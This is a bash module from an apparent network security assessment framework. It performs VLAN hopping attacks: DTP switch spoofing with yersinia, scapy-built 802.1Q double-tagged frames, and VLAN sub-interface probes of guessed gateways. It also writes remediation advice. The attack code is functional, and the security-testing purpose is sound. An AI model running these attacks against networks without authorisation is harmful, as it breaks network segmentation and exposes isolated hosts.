#!/usr/bin/env bash
# MODULE_META
# NAME="VLAN Hopping"
# CATEGORY="C"
# DEPS="none"
# CRITICAL="no"
# TOOLS="nmap,ip"
# DESC="Attempt 802.1Q double-tagging and DTP spoofing to reach other VLANs"
# REQS="managed_iface"
# PCAP="yes"
# DECODE="none"

#===============================================================================
#  modules/c3_vlan_hopping.sh
#  C3: VLAN Hopping Attack ★CRITICAL★
#
#  PURPOSE:
#    Test if the target WiFi port is vulnerable to VLAN hopping via:
#    1. Switch Spoofing (DTP negotiation to become a trunk)
#    2. Double Tagging (802.1Q double-encapsulation to reach other VLANs)
#
#  TOOLS: ${TOOL_PATHS[yersinia]}, vconfig/ip link, scapy, ${TOOL_PATHS[tcpdump]}
#  PHASE: 2A — Attack Simulations
#  DEPENDENCIES: B3 (for native VLAN info)
#  CRITICAL: YES
#
#  EVIDENCE PRODUCED:
#    - c3_dtp_attack.txt           (DTP spoofing results)
#    - c3_double_tag_results.txt   (double-tagging test results)
#    - c3_vlan_hopping.pcap        (packet capture during tests)
#
#  RESULT JSON FIELDS:
#    - dtp_vulnerable: bool
#    - double_tag_vulnerable: bool
#    - vlans_accessible[]: VLANs reached via hopping
#    - trunk_negotiated: bool
#===============================================================================

run_c3() {
    set -uo pipefail
    local total_steps=6
    local evidence_prefix="${SESSION_EVIDENCE_DIR}/c3"

    #--- Step 1: Verify tools and prerequisites ---
    log_step 1 $total_steps "Verifying tools and loading B3 data"
    update_tc_progress 1 $total_steps "Checking"

    check_module_dependencies "C3" || return 1

    local has_yersinia=true
    local has_scapy=true

    if ! command -v yersinia &>/dev/null; then
        has_yersinia=false
        log_warn "yersinia not available — DTP attack testing limited"
    fi
    if ! command -v scapy &>/dev/null && ! python3 -c "import scapy" 2>/dev/null; then
        has_scapy=false
        log_warn "scapy not available — double-tagging test limited"
    fi

        # Ensure monitor mode is globally disabled (we need to be connected)
    ensure_managed_mode || return 1


    if [[ -n "${MONITOR_INTERFACE:-}" ]]; then
        disable_monitor_mode
        sleep 3
    fi

    local iface="${WIFI_INTERFACE:-wlan0}"

    # Load B3 data for native VLAN info
    local native_vlan=""
    local target_vlans=()

    if has_tc_results "B3"; then
        local b3_data
        b3_data=$(load_tc_result "B3")

        # Get native VLAN from CDP/LLDP
        native_vlan=$(echo "$b3_data" | run_fg jq -r '.native_vlans[0] // ""')
        while IFS= read -r vlan; do
            [[ -n "$vlan" && "$vlan" != "null" ]] && target_vlans+=("$vlan")
        done < <(echo "$b3_data" | run_fg jq -r '.native_vlans[]' 2>/dev/null)

        if [[ -n "$native_vlan" ]]; then
            log_info "Native VLAN from B3: ${native_vlan}"
        fi
    else
        log_info "B3 data not available — will use default VLANs for testing"
    fi

    # If no VLANs discovered, test common ones
    if [[ ${#target_vlans[@]} -eq 0 ]]; then
        target_vlans=(1 10 20 50 100 200)
    fi

    log_info "Target VLANs for hopping: ${target_vlans[*]}"

    #--- Warning banner ---
    echo ""
    echo -e "${C_BG_RED}${C_WHITE}${C_BOLD}"
    echo "  ╔════════════════════════════════════════════════════════════════════╗"
    echo "  ║  ★ VLAN HOPPING ATTACK TEST ★                                    ║"
    echo "  ║                                                                    ║"
    echo "  ║  This test attempts:                                               ║"
    echo "  ║  1. DTP trunk negotiation (switch spoofing)                        ║"
    echo "  ║  2. 802.1Q double-tagging                                          ║"
    echo "  ║                                                                    ║"
    echo "  ║  May temporarily disrupt network on tested port.                   ║"
    echo "  ╚════════════════════════════════════════════════════════════════════╝"
    echo -e "${C_RESET}"
    echo ""
    get_or_request_param "confirm" "  Proceed with VLAN hopping tests? [Y/n]"
    [[ "${confirm,,}" == "n" ]] && return 1

    #--- Step 2: DTP Switch Spoofing ---
    log_step 2 $total_steps "Testing DTP switch spoofing (trunk negotiation)"
    update_tc_progress 2 $total_steps "DTP attack"

    check_abort || return 1

    local dtp_file="${evidence_prefix}_dtp_attack.txt"
    local dtp_vulnerable="false"
    local trunk_negotiated="false"
    local capture_file="${evidence_prefix}_vlan_hopping.pcap"

    {
        echo "============================================================"
        echo "  C3: DTP Switch Spoofing Test"
        echo "  Date: $(date '+%Y-%m-%d %H:%M:%S')"
        echo "  Interface: ${iface}"
        echo "============================================================"
        echo ""
    } > "$dtp_file"

    # Start packet capture
    spawn_bg "c3_tcpdump" "${TOOL_PATHS[tcpdump]}" -i "$iface" -w "$capture_file" "vlan or (ether[20:2] == 0x2004)"

    if [[ "$has_yersinia" == "true" ]]; then
        log_cmd "${TOOL_PATHS[yersinia]} dtp -attack 1 -interface ${iface}"
        echo "Attempting DTP trunk negotiation via ${TOOL_PATHS[yersinia]}..." >> "$dtp_file"

        # Send DTP desirable frames
        start_countdown 30 "Sending DTP trunk negotiation frames"
        timeout 30 "${TOOL_PATHS[yersinia]}" dtp -attack 1 -interface "$iface" >/dev/null 2>&1 || true
        stop_countdown

        # Check if trunk was negotiated by looking for VLAN-tagged frames
        sleep 5
        local vlan_frames
        vlan_frames=$(timeout 10 ${TOOL_PATHS[tcpdump]} -i "$iface" -c 5 "vlan" 2>/dev/null | wc -l) || true

        if [[ $vlan_frames -gt 0 ]]; then
            dtp_vulnerable="true"
            trunk_negotiated="true"
            log_result "CRITICAL" "DTP trunk negotiation SUCCEEDED — port became a trunk!"
            echo "RESULT: TRUNK NEGOTIATED — VULNERABLE" >> "$dtp_file"
        else
            log_info "DTP trunk negotiation did not succeed"
            echo "RESULT: Trunk not negotiated — port appears hardcoded as access" >> "$dtp_file"
        fi
    else
        # Manual DTP frame using raw socket (simplified)
        log_info "yersinia not available — attempting manual DTP frame"
        echo "Yersinia not available. Manual DTP test limited." >> "$dtp_file"

        # Check if any DTP frames were observed (from B3 or passively)
        if has_tc_results "B3"; then
            local dtp_count
            dtp_count=$(echo "$b3_data" | run_fg jq '.dtp_frames // 0')
            if [[ $dtp_count -gt 0 ]]; then
                dtp_vulnerable="true"
                log_result "FINDING" "DTP frames detected in B3 — port may be trunk-negotiable"
                echo "WARNING: DTP frames observed in B3 capture (${dtp_count} frames)" >> "$dtp_file"
            fi
        fi
    fi

    #--- Step 3: 802.1Q Double Tagging ---
    log_step 3 $total_steps "Testing 802.1Q double-tagging"
    update_tc_progress 3 $total_steps "Double-tag"

    check_abort || return 1

    local double_tag_file="${evidence_prefix}_double_tag_results.txt"
    local double_tag_vulnerable="false"
    local vlans_accessible="[]"

    {
        echo "============================================================"
        echo "  C3: 802.1Q Double-Tagging Test"
        echo "  Date: $(date '+%Y-%m-%d %H:%M:%S')"
        echo "  Native VLAN: ${native_vlan:-unknown}"
        echo "  Target VLANs: ${target_vlans[*]}"
        echo "============================================================"
        echo ""
    } > "$double_tag_file"

    if [[ "$has_scapy" == "true" ]]; then
        # Use scapy for double-tagged frames
        for target_vlan in "${target_vlans[@]}"; do
            check_abort || return 1

            log_info "Testing double-tag: native=${native_vlan:-1} → target=${target_vlan}"

            # Create a double-tagged ICMP ping
            # Outer: native VLAN (will be stripped by first switch)
            # Inner: target VLAN (will be forwarded into target VLAN)
            local outer_vlan="${native_vlan:-1}"

            # Target: gateway of target VLAN (guess common patterns)
            local target_gw
            if [[ "$target_vlan" -lt 256 ]]; then
                target_gw="10.${target_vlan}.0.1"
            else
                target_gw="10.0.${target_vlan}.1"
            fi

            local scapy_script
            scapy_script=$(cat <<SCAPY_EOF
from scapy.all import *
import sys

iface = "${iface}"
outer_vlan = ${outer_vlan}
inner_vlan = ${target_vlan}
target = "${target_gw}"

# Double-tagged frame: Ether/Dot1Q(outer)/Dot1Q(inner)/IP/ICMP
pkt = Ether(dst="ff:ff:ff:ff:ff:ff") / \
      Dot1Q(vlan=outer_vlan) / \
      Dot1Q(vlan=inner_vlan) / \
      IP(dst=target, ttl=5) / \
      ICMP(type=8, code=0)

sendp(pkt, iface=iface, count=3, verbose=False)
print(f"Sent double-tagged frames: outer={outer_vlan}, inner={inner_vlan}, target={target}")
SCAPY_EOF
            )

            local scapy_result
            scapy_result=$(echo "$scapy_script" | timeout 10 python3 2>/dev/null || true)
            echo "  VLAN ${target_vlan}: ${scapy_result:-sent}" >> "$double_tag_file"
        done

        # Check for responses (would come back untagged or on the inner VLAN)
        sleep 5

        # Look for ICMP replies in the capture
        local icmp_replies
        ensure_user_ownership "$capture_file"
        icmp_replies=$(run_as_user tshark -r "$capture_file" -Y "icmp.type == 0" -T fields -e ip.src 2>/dev/null | sort -u || true)

        if [[ -n "$icmp_replies" ]]; then
            double_tag_vulnerable="true"
            while IFS= read -r reply_ip; do
                [[ -z "$reply_ip" ]] && continue
                log_result "CRITICAL" "Double-tagging response from ${reply_ip}!"
                vlans_accessible=$(echo "$vlans_accessible" | run_fg jq --arg v "$reply_ip" '. += [$v]')
            done <<< "$icmp_replies"
        else
            log_info "No responses to double-tagged frames (expected if properly configured)"
        fi
    else
        # Manual VLAN interface approach
        log_info "scapy not available — testing VLAN tagging via run_fg ip link"

        for target_vlan in "${target_vlans[@]}"; do
            check_abort || return 1

            local vlan_iface="${iface}.${target_vlan}"

            # Try to create VLAN sub-interface
            run_fg ip link add link "$iface" name "$vlan_iface" type vlan id "$target_vlan" 2>/dev/null || continue
            run_fg ip link set "$vlan_iface" up 2>/dev/null || continue
            run_fg ip addr add "169.254.${RANDOM:0:2}.${RANDOM:0:2}/16" dev "$vlan_iface" 2>/dev/null || true

            log_info "Created VLAN interface ${vlan_iface} (VLAN ${target_vlan})"

            # Test reachability on this VLAN
            local vlan_gw
            if [[ "$target_vlan" -lt 256 ]]; then
                vlan_gw="10.${target_vlan}.0.1"
            else
                vlan_gw="10.0.${target_vlan}.1"
            fi

            if ping -c 2 -W 2 -I "$vlan_iface" "$vlan_gw" &>/dev/null; then
                double_tag_vulnerable="true"
                log_result "CRITICAL" "VLAN ${target_vlan} reachable via tagged frames! Gateway ${vlan_gw} responded."
                vlans_accessible=$(echo "$vlans_accessible" | run_fg jq --arg v "${target_vlan}" '. += [$v]')
                echo "  VLAN ${target_vlan}: REACHABLE (${vlan_gw}) ← CRITICAL" >> "$double_tag_file"
            else
                echo "  VLAN ${target_vlan}: Not reachable (${vlan_gw})" >> "$double_tag_file"
            fi

            # Clean up VLAN interface
            run_fg ip link delete "$vlan_iface" 2>/dev/null || true
        done
    fi

    # Stop capture
    stop_process "c3_tcpdump"
    validate_pcap "$capture_file" "VLAN hopping attack traffic capture"

    #--- Step 4: Analyze Q-in-Q support ---
    log_step 4 $total_steps "Checking for Q-in-Q (802.1ad) support"
    update_tc_progress 4 $total_steps "Q-in-Q"

    check_abort || return 1

    # Check if the switch forwards Q-in-Q tagged frames
    local qinq_supported="unknown"
    if [[ -f "$capture_file" ]]; then
        local qinq_frames
        qinq_frames=$(run_as_user tshark -r "$capture_file" -Y "vlan.id" 2>/dev/null | wc -l) || true
        if [[ $qinq_frames -gt 0 ]]; then
            qinq_supported="yes"
            log_info "${qinq_frames} VLAN-tagged frames observed in capture"
        else
            qinq_supported="no"
        fi
    fi

    #--- Step 5: Test for PVLAN proxy attack ---
    log_step 5 $total_steps "Testing for Private VLAN proxy attack"
    update_tc_progress 5 $total_steps "PVLAN test"

    check_abort || return 1

    # If we know the gateway, try to use it as a proxy to reach isolated hosts
    local pvlan_vulnerable="false"
    if [[ -n "$GATEWAY_IP" ]]; then
        # The PVLAN proxy attack uses ARP manipulation to redirect traffic through the gateway
        # to reach hosts that should be isolated. This is a conceptual test.
        log_info "PVLAN proxy attack test: conceptual verification"
        log_info "If client isolation (B1) failed AND routing is enabled on the gateway,"
        log_info "a PVLAN proxy attack may allow reaching isolated hosts via the gateway."

        # Check if IP forwarding is enabled on gateway (traceroute with TTL=1)
        local ttl_test
        ttl_test=$(ping -c 1 -t 1 "$GATEWAY_IP" 2>&1 || true)
        if echo "$ttl_test" | grep -q "Time to live exceeded"; then
            log_result "INFO" "Gateway forwards packets (TTL exceeded) — PVLAN proxy may be possible"
        fi
    fi

    #--- Step 6: Save results ---
    log_step 6 $total_steps "Saving results"
    update_tc_progress 6 $total_steps "Saving"

    local result_status="SECURE"
    local result_summary=""
    local recommendations=""

    local vlans_accessed
    vlans_accessed=$(echo "$vlans_accessible" | run_fg jq 'length')

    if [[ "$trunk_negotiated" == "true" ]]; then
        result_status="FINDING"
        result_summary="CRITICAL: DTP trunk negotiation succeeded — the target port can be converted to a trunk, providing access to all VLANs. "
        recommendations="IMMEDIATE: Set all target-facing ports to 'switchport mode access' and 'switchport nonegotiate'. Disable DTP globally if possible. "
    fi

    if [[ "$double_tag_vulnerable" == "true" ]]; then
        result_status="FINDING"
        result_summary+="CRITICAL: 802.1Q double-tagging attack succeeded — ${vlans_accessed} VLAN(s) accessible. "
        recommendations+="Ensure the native VLAN on trunk ports is NOT used as the target VLAN. Use an unused VLAN as native VLAN. Enable 'vlan dot1q tag native' on trunk ports. "
    fi

    if [[ "$dtp_vulnerable" == "true" && "$trunk_negotiated" != "true" ]]; then
        result_status="FINDING"
        result_summary+="DTP frames detected on the target port — trunk negotiation risk exists. "
        recommendations+="Disable DTP on target-facing ports with 'switchport nonegotiate'. "
    fi

    if [[ "$result_status" == "SECURE" ]]; then
        result_summary="No VLAN hopping vulnerabilities detected. DTP trunk negotiation failed. Double-tagging did not reach other VLANs. Port is properly configured as access mode."
        recommendations="No action needed. Maintain 'switchport mode access' and 'switchport nonegotiate' on target ports."
    fi

    local result_json
    evidence_register_file "c3_dtp_attack.txt"
    evidence_register_file "c3_double_tag_results.txt"
    evidence_register_file "c3_vlan_hopping.pcap"

    result_json=$(run_fg jq -n \
        --arg status "$result_status" \
        --arg summary "$result_summary" \
        --arg details "DTP: ${dtp_vulnerable}, Trunk: ${trunk_negotiated}, Double-tag: ${double_tag_vulnerable}, VLANs: ${vlans_accessed}" \
        --arg recommendations "$recommendations" \
        --arg dtp_vulnerable "$dtp_vulnerable" \
        --arg double_tag_vulnerable "$double_tag_vulnerable" \
        --arg trunk_negotiated "$trunk_negotiated" \
        --argjson vlans_accessible "$vlans_accessible" \
        --arg native_vlan "${native_vlan:-unknown}" \
        '{
            status: $status,
            summary: $summary,
            details: $details,
            recommendations: $recommendations,
            dtp_vulnerable: ($dtp_vulnerable == "true"),
            double_tag_vulnerable: ($double_tag_vulnerable == "true"),
            trunk_negotiated: ($trunk_negotiated == "true"),
            vlans_accessible: $vlans_accessible,
            native_vlan: $native_vlan,
                    }')

    save_tc_result "C3" "$result_json" 1 1 1 1 1 1 1 0 1 1 0
    save_session_state

    # Display summary
    echo ""
    if [[ "$trunk_negotiated" == "true" ]]; then
        log_result "CRITICAL" "★ DTP trunk negotiation SUCCEEDED — full VLAN access!"
    elif [[ "$dtp_vulnerable" == "true" ]]; then
        log_result "FINDING" "DTP frames present — trunk negotiation risk"
    fi

    if [[ "$double_tag_vulnerable" == "true" ]]; then
        log_result "CRITICAL" "★ Double-tagging attack SUCCEEDED — ${vlans_accessed} VLAN(s) reached"
    else
        log_result "SECURE" "Double-tagging did not reach other VLANs"
    fi

    return 0
}